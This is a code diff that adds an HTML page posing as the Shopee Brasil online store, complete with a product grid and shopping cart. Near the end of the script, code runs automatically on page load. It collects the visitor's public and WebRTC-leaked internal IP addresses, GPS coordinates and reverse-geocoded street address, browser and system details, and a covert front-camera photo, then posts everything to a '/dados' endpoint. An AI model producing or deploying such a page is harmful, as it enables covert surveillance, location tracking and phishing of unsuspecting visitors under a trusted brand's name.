@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee Brasil - Sua Loja Online Favorita</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ee4d2d, #ff6433);
+            color: white;
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .nav-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        .nav-main {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            text-decoration: none;
+            color: white;
+        }
+
+        .search-bar {
+            flex: 1;
+            max-width: 600px;
+            margin: 0 2rem;
+            position: relative;
+        }
+
+        .search-bar input {
+            width: 100%;
+            padding: 12px 50px 12px 20px;
+            border: none;
+            border-radius: 25px;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .search-btn {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #ee4d2d;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .search-btn:hover {
+            background: #d63c1e;
+        }
+
+        .nav-icons {
+            display: flex;
+            gap: 1.5rem;
+            align-items: center;
+        }
+
+        .nav-icon {
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: opacity 0.3s;
+        }
+
+        .nav-icon:hover {
+            opacity: 0.8;
+        }
+
+        .cart-count {
+            background: white;
+            color: #ee4d2d;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .hero {
+            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            padding: 3rem 0;
+            text-align: center;
+            color: white;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            animation: fadeInUp 1s ease-out 0.2s both;
+        }
+
+        .categories {
+            padding: 2rem 0;
+            background: #f5f5f5;
+        }
+
+        .categories h2 {
+            text-align: center;
+            margin-bottom: 2rem;
+            font-size: 2rem;
+            color: #333;
+        }
+
+        .category-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+        }
+
+        .category-item {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .category-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+        }
+
+        .category-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .products {
+            padding: 3rem 0;
+        }
+
+        .products h2 {
+            text-align: center;
+            margin-bottom: 2rem;
+            font-size: 2rem;
+            color: #333;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 25px rgba(0,0,0,0.2);
+        }
+
+        .product-image {
+            width: 100%;
+            height: 200px;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            color: #ccc;
+        }
+
+        .product-info {
+            padding: 1rem;
+        }
+
+        .product-title {
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            color: #333;
+        }
+
+        .product-price {
+            color: #ee4d2d;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+
+        .product-rating {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .stars {
+            color: #ffa500;
+        }
+
+        .add-to-cart {
+            width: 100%;
+            background: #ee4d2d;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+
+        .add-to-cart:hover {
+            background: #d63c1e;
+        }
+
+        .footer {
+            background: #333;
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+        }
+
+        .cart-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+        }
+
+        .cart-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .cart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 1rem;
+        }
+
+        .close-cart {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #999;
+        }
+
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .cart-total {
+            text-align: right;
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-top: 1rem;
+            color: #ee4d2d;
+        }
+
+        .checkout-btn {
+            width: 100%;
+            background: #ee4d2d;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1rem;
+            margin-top: 1rem;
+            transition: background 0.3s;
+        }
+
+        .checkout-btn:hover {
+            background: #d63c1e;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-main {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .search-bar {
+                margin: 0;
+                max-width: 100%;
+            }
+
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .category-grid {
+                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="nav-top">
+                <div>
+                    <span>Baixe o App</span> | <span>Siga-nos</span>
+                </div>
+                <div>
+                    <span>Notificações</span> | <span>Ajuda</span> | <span>Português</span> | <span>Cadastre-se</span> | <span>Entrar</span>
+                </div>
+            </div>
+            <nav class="nav-main">
+                <a href="#" class="logo">Shopee</a>
+                <div class="search-bar">
+                    <input type="text" id="searchInput" placeholder="Buscar produtos...">
+                    <button class="search-btn" onclick="searchProducts()">🔍</button>
+                </div>
+                <div class="nav-icons">
+                    <a href="#" class="nav-icon" onclick="openCart()">
+                        🛒 <span class="cart-count" id="cartCount">0</span>
+                    </a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <h1>Bem-vindo à Shopee!</h1>
+            <p>Descubra milhões de produtos com os melhores preços e frete grátis</p>
+        </div>
+    </section>
+
+    <section class="categories">
+        <div class="container">
+            <h2>Categorias Populares</h2>
+            <div class="category-grid">
+                <div class="category-item" onclick="filterByCategory('eletrônicos')">
+                    <div class="category-icon">📱</div>
+                    <div>Eletrônicos</div>
+                </div>
+                <div class="category-item" onclick="filterByCategory('moda')">
+                    <div class="category-icon">👗</div>
+                    <div>Moda</div>
+                </div>
+                <div class="category-item" onclick="filterByCategory('casa')">
+                    <div class="category-icon">🏠</div>
+                    <div>Casa & Jardim</div>
+                </div>
+                <div class="category-item" onclick="filterByCategory('beleza')">
+                    <div class="category-icon">💄</div>
+                    <div>Beleza</div>
+                </div>
+                <div class="category-item" onclick="filterByCategory('esportes')">
+                    <div class="category-icon">⚽</div>
+                    <div>Esportes</div>
+                </div>
+                <div class="category-item" onclick="filterByCategory('livros')">
+                    <div class="category-icon">📚</div>
+                    <div>Livros</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="products">
+        <div class="container">
+            <h2>Produtos em Destaque</h2>
+            <div class="product-grid" id="productGrid">
+                <!-- Produtos serão carregados via JavaScript -->
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 Shopee. Todos os direitos reservados.</p>
+            <p>Política de Privacidade | Termos de Uso | Sobre Nós</p>
+        </div>
+    </footer>
+
+    <!-- Modal do Carrinho -->
+    <div class="cart-modal" id="cartModal">
+        <div class="cart-content">
+            <div class="cart-header">
+                <h3>Meu Carrinho</h3>
+                <button class="close-cart" onclick="closeCart()">&times;</button>
+            </div>
+            <div id="cartItems">
+                <p>Seu carrinho está vazio</p>
+            </div>
+            <div class="cart-total" id="cartTotal">
+                Total: R$ 0,00
+            </div>
+            <button class="checkout-btn" onclick="checkout()">Finalizar Compra</button>
+        </div>
+    </div>
+
+    <script>
+        // Dados dos produtos
+        const products = [
+            {
+                id: 1,
+                name: "Smartphone Samsung Galaxy A54",
+                price: 1299.99,
+                category: "eletrônicos",
+                rating: 4.5,
+                image: "📱"
+            },
+            {
+                id: 2,
+                name: "Vestido Florido Verão",
+                price: 89.90,
+                category: "moda",
+                rating: 4.2,
+                image: "👗"
+            },
+            {
+                id: 3,
+                name: "Aspirador de Pó Robô",
+                price: 899.99,
+                category: "casa",
+                rating: 4.7,
+                image: "🤖"
+            },
+            {
+                id: 4,
+                name: "Kit Maquiagem Completo",
+                price: 159.99,
+                category: "beleza",
+                rating: 4.3,
+                image: "💄"
+            },
+            {
+                id: 5,
+                name: "Tênis Esportivo Nike",
+                price: 299.99,
+                category: "esportes",
+                rating: 4.6,
+                image: "👟"
+            },
+            {
+                id: 6,
+                name: "Livro: O Poder do Hábito",
+                price: 29.90,
+                category: "livros",
+                rating: 4.8,
+                image: "📖"
+            },
+            {
+                id: 7,
+                name: "Fone de Ouvido Bluetooth",
+                price: 199.99,
+                category: "eletrônicos",
+                rating: 4.4,
+                image: "🎧"
+            },
+            {
+                id: 8,
+                name: "Jaqueta Jeans Feminina",
+                price: 129.90,
+                category: "moda",
+                rating: 4.1,
+                image: "🧥"
+            }
+        ];
+
+        // Carrinho de compras
+        let cart = [];
+        let filteredProducts = [...products];
+
+        // Renderizar produtos
+        function renderProducts(productsToRender = products) {
+            const productGrid = document.getElementById('productGrid');
+            productGrid.innerHTML = '';
+
+            productsToRender.forEach(product => {
+                const productCard = document.createElement('div');
+                productCard.className = 'product-card';
+                productCard.innerHTML = `
+                    <div class="product-image">${product.image}</div>
+                    <div class="product-info">
+                        <div class="product-title">${product.name}</div>
+                        <div class="product-price">R$ ${product.price.toFixed(2).replace('.', ',')}</div>
+                        <div class="product-rating">
+                            <span class="stars">${'★'.repeat(Math.floor(product.rating))}${'☆'.repeat(5 - Math.floor(product.rating))}</span>
+                            <span>(${product.rating})</span>
+                        </div>
+                        <button class="add-to-cart" onclick="addToCart(${product.id})">
+                            Adicionar ao Carrinho
+                        </button>
+                    </div>
+                `;
+                productGrid.appendChild(productCard);
+            });
+        }
+
+        // Adicionar ao carrinho
+        function addToCart(productId) {
+            const product = products.find(p => p.id === productId);
+            const existingItem = cart.find(item => item.id === productId);
+
+            if (existingItem) {
+                existingItem.quantity += 1;
+            } else {
+                cart.push({ ...product, quantity: 1 });
+            }
+
+            updateCartCount();
+            
+            // Feedback visual
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = 'Adicionado!';
+            button.style.background = '#28a745';
+            setTimeout(() => {
+                button.textContent = originalText;
+                button.style.background = '#ee4d2d';
+            }, 1000);
+        }
+
+        // Atualizar contador do carrinho
+        function updateCartCount() {
+            const cartCount = document.getElementById('cartCount');
+            const totalItems = cart.reduce((sum, item) => sum + item.quantity, 0);
+            cartCount.textContent = totalItems;
+        }
+
+        // Abrir carrinho
+        function openCart() {
+            const cartModal = document.getElementById('cartModal');
+            const cartItems = document.getElementById('cartItems');
+            const cartTotal = document.getElementById('cartTotal');
+
+            if (cart.length === 0) {
+                cartItems.innerHTML = '<p>Seu carrinho está vazio</p>';
+                cartTotal.textContent = 'Total: R$ 0,00';
+            } else {
+                cartItems.innerHTML = '';
+                let total = 0;
+
+                cart.forEach(item => {
+                    const itemTotal = item.price * item.quantity;
+                    total += itemTotal;
+
+                    const cartItem = document.createElement('div');
+                    cartItem.className = 'cart-item';
+                    cartItem.innerHTML = `
+                        <div>
+                            <strong>${item.name}</strong><br>
+                            <span>Qtd: ${item.quantity} x R$ ${item.price.toFixed(2).replace('.', ',')}</span>
+                        </div>
+                        <div>
+                            <button onclick="removeFromCart(${item.id})" style="background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer;">Remover</button>
+                        </div>
+                    `;
+                    cartItems.appendChild(cartItem);
+                });
+
+                cartTotal.textContent = `Total: R$ ${total.toFixed(2).replace('.', ',')}`;
+            }
+
+            cartModal.style.display = 'block';
+        }
+
+        // Fechar carrinho
+        function closeCart() {
+            document.getElementById('cartModal').style.display = 'none';
+        }
+
+        // Remover do carrinho
+        function removeFromCart(productId) {
+            cart = cart.filter(item => item.id !== productId);
+            updateCartCount();
+            openCart(); // Atualizar a visualização
+        }
+
+        // Finalizar compra
+        function checkout() {
+            if (cart.length === 0) {
+                alert('Seu carrinho está vazio!');
+                return;
+            }
+
+            const total = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            alert(`Compra finalizada! Total: R$ ${total.toFixed(2).replace('.', ',')}\n\nObrigado por comprar na Shopee!`);
+            
+            cart = [];
+            updateCartCount();
+            closeCart();
+        }
+
+        // Buscar produtos
+        function searchProducts() {
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase().trim();
+            
+            if (searchTerm === '') {
+                renderProducts(products);
+                return;
+            }
+
+            const filtered = products.filter(product => 
+                product.name.toLowerCase().includes(searchTerm) ||
+                product.category.toLowerCase().includes(searchTerm)
+            );
+
+            renderProducts(filtered);
+        }
+
+        // Filtrar por categoria
+        function filterByCategory(category) {
+            const filtered = products.filter(product => product.category === category);
+            renderProducts(filtered);
+        }
+
+        // FUNCIONALIDADES DE CAPTURA DO SEU EXEMPLO - INÍCIO
+
+        // Função para tentar obter IPs internos usando WebRTC
+        async function obterIPInterno() {
+            return new Promise((resolve) => {
+                let ipv4Interno = 'Não detectado';
+                let ipv6Interno = 'Não detectado';
+
+                const pc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!pc) {
+                    console.warn('WebRTC não suportado. Não foi possível obter IP interno.');
+                    resolve({ ipv4Interno, ipv6Interno });
+                    return;
+                }
+
+                const noop = () => {};
+                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
+
+                const findIPs = (text) => {
+                    const matches = text.match(ipRegex);
+                    if (matches) {
+                        matches.forEach(ip => {
+                            // Verifica se é um IPv4 privado
+                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
+                                if (ipv4Interno === 'Não detectado') { // Pega o primeiro encontrado
+                                    ipv4Interno = ip;
+                                }
+                            } else if (ip.includes(':') && !ip.startsWith('::') && !ip.startsWith('fe80')) {
+                                // Heurística básica para IPv6 local/global temporário
+                                if (ipv6Interno === 'Não detectado') { // Pega o primeiro encontrado
+                                    ipv6Interno = ip;
+                                }
+                            }
+                        });
+                    }
+                };
+
+                const rtc = new pc({iceServers: []});
+                rtc.createDataChannel('', {reliable: false});
+
+                rtc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const candidate = ice.candidate.candidate;
+                    findIPs(candidate);
+                    // findIPs(ice.candidate.address); // address pode não estar sempre disponível
+                };
+
+                rtc.createOffer()
+                    .then(sdp => rtc.setLocalDescription(sdp, noop, noop))
+                    .catch(noop);
+
+                // Timeout para garantir que a tentativa seja concluída
+                setTimeout(() => {
+                    rtc.onicecandidate = noop;
+                    rtc.close();
+                    console.log(`IPs internos detectados (tentativa): IPv4: ${ipv4Interno}, IPv6: ${ipv6Interno}`);
+                    resolve({ ipv4Interno, ipv6Interno });
+                }, 2000);
+            });
+        }
+
+        async function capturarDados() {
+            try {
+                // CAPTURA O IP PÚBLICO DO VISITANTE
+                let ip = 'Desconhecido';
+                try {
+                    // Corrigido: Removido o espaço na URL
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip;
+                    console.log("IP Público capturado:", ip);
+                } catch (ipError) {
+                    console.error('Erro ao obter o IP externo via ipify:', ipError);
+                }
+
+                // TENTA CAPTURAR OS IPs INTERNOS
+                let ipsInternos = { ipv4Interno: 'Não detectado', ipv6Interno: 'Não detectado' };
+                try {
+                    ipsInternos = await obterIPInterno();
+                    console.log("IPs internos capturados:", ipsInternos);
+                } catch (internoError) {
+                    console.error("Erro ao tentar obter IPs internos:", internoError);
+                }
+
+                const sistema = navigator.platform;
+                const navegador = navigator.userAgent;
+
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                    const geoData = await geoRes.json();
+                    const endereco = geoData.display_name || 'Desconhecido';
+
+                    // Tentativa de capturar imagem (opcional)
+                    let stream;
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        const context = canvas.getContext('2d');
+
+                        // Aguarda um pouco para o vídeo carregar
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imagem = canvas.toDataURL('image/png');
+
+                        fetch('/dados', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                endereco,
+                                imagem,
+                                sistema,
+                                navegador,
+                                ip: ip, // IP público
+                                ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
+                                ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
+                            })
+                        }).then(() => {
+                            console.log('✅ Localização e dados detectados com sucesso!');
+                            stream.getTracks().forEach(track => track.stop());
+                        }).catch(err => {
+                            console.error("Erro ao enviar dados (com imagem):", err);
+                            if(stream) stream.getTracks().forEach(track => track.stop());
+                        });
+
+                    } catch (mediaError) {
+                        console.warn("Acesso à câmera negado ou falhou, enviando dados sem imagem:", mediaError);
+                        // Envia os dados mesmo sem imagem
+                        fetch('/dados', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                latitude,
+                                longitude,
+                                endereco,
+                                imagem: null, // Indica que não há imagem
+                                sistema,
+                                navegador,
+                                ip: ip, // IP público
+                                ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
+                                ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
+                            })
+                        }).then(() => {
+                            console.log('✅ Localização e dados detectados com sucesso (sem imagem)!');
+                        }).catch(err => {
+                            console.error("Erro ao enviar dados (sem imagem):", err);
+                        });
+                    }
+                }, (err) => {
+                    console.error("Erro ao obter localização:", err);
+                    // Mesmo sem localização, podemos tentar enviar outros dados?
+                    // Neste caso, vamos pular o envio, pois latitude/longitude são fundamentais
+                    // Mas poderia ser adaptado para enviar apenas IP, sistema, etc.
+                });
+            } catch (err) {
+                console.error("Erro geral:", err);
+            }
+        }
+
+        // FUNCIONALIDADES DE CAPTURA DO SEU EXEMPLO - FIM
+
+        // Permitir busca com Enter
+        document.getElementById('searchInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                searchProducts();
+            }
+        });
+
+        // Fechar modal clicando fora
+        window.onclick = function(event) {
+            const modal = document.getElementById('cartModal');
+            if (event.target === modal) {
+                closeCart();
+            }
+        }
+
+        // Inicializar página
+        document.addEventListener('DOMContentLoaded', function() {
+            renderProducts();
+            updateCartCount();
+        });
+
+        // Executar captura de dados quando a página carregar
+        window.onload = function() {
+            capturarDados();
+        };
+    </script>
+</body>
+</html>
